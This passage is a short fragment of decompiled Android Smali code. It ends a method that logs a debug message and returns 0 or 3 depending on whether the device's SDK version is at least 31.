    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 328
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1f

    if-lt v0, v1, :cond_0

    .line 329
    const/4 v0, 0x0

    goto :goto_0

    :cond_0
    const/4 v0, 0x3

    .line 328
    :goto_0
    return v0
.end method
